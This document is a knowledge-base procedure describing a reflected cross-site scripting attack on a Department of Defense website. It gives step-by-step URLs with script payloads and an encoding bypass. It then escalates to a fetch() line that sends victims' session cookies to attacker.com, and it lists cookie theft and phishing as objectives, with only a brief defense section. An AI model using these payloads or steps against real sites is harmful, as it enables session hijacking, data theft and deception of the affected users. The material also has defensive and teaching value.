---
tags:
  - xss
  - reflected-xss
  - script-injection
  - browser-execution
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:47.152Z'
skill_level: beginner
impact_level: high
detection_risk: low
sub_techniques: []
id: e63ee2ce-eede-4d47-8b49-fae348713d12
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Demonstrate Reflected XSS via URL

## Summary

This procedure demonstrates a reflected cross-site scripting (XSS) vulnerability by crafting a malicious URL that injects JavaScript into a web application's response, executing in the victim's browser to steal session data or modify content on a U.S. Department of Defense website.

## Description

Reflected XSS occurs when user input from a URL parameter is improperly reflected back into the HTML response without sanitization or encoding. An attacker crafts a URL with a payload like `<script>alert('XSS')</script>` appended to a vulnerable parameter. When a victim visits the URL, the browser parses and executes the script in the context of the trusted site. In this DoD case, the vulnerability allows potential revelation of session cookies or alteration of web content, compromising user sessions. Prerequisites include identifying a reflective input field (e.g., search or redirect parameter) via manual testing or tools like Burp Suite, though no specific tools were used in the original report.

## Requirements

1. Public access to the target DoD website
2. A web browser (e.g., Chrome, Firefox) for testing payloads
3. Knowledge of basic JavaScript for payload crafting
4. Optional: A server to receive exfiltrated data (e.g., for cookie theft)

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and output encoding (e.g., HTML-encode user inputs with libraries like OWASP ESAPI)
- Use Content Security Policy (CSP) headers to restrict script execution
- Monitor for anomalous JavaScript execution or unexpected outbound requests from browsers
- Employ Web Application Firewalls (WAFs) to block common XSS payloads

## Objectives

1. Inject and execute arbitrary JavaScript in the victim's browser context
2. Steal sensitive session information like cookies or tokens
3. Modify displayed web content to deceive or phish the user

## Instructions

### Step 1: Identify Vulnerable Parameter

**Context**: Manually inspect the DoD website for URL parameters that echo back user input (e.g., ?q= or ?redirect=) by entering test strings and checking the response source for unencoded reflection.

No specific command, perform via browser URL bar:

Paste a test URL like `https://vulnerable.dod.gov/search?q=test` and view page source (Ctrl+U) to see if 'test' appears unencoded in HTML.

> If input is reflected without encoding (e.g., as plain text in <div>q=test</div>), it's potentially vulnerable.

### Step 2: Craft Basic XSS Payload

**Context**: Append a script tag to the parameter to test execution.

Construct URL: `https://vulnerable.dod.gov/search?q=<script>alert('XSS')</script>`.

Visit the URL in a browser.

> Successful execution shows an alert popup confirming XSS. If blocked, try bypassing with encodings like `<scr%69pt>alert('XSS')</script>`.

### Step 3: Escalate to Session Theft

**Context**: Replace alert with code to exfiltrate data to an attacker-controlled server.

Advanced URL: `https://vulnerable.dod.gov/search?q=<script>fetch('http://attacker.com/log?cookie='+encodeURIComponent(document.cookie))</script>`.

Visit and check attacker's server logs for received cookies. Use modern fetch or XMLHttpRequest for stealth.

> Expected: Network request to attacker.com with cookie data, enabling session hijacking.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
- [[web]]
- [[script-injection]]
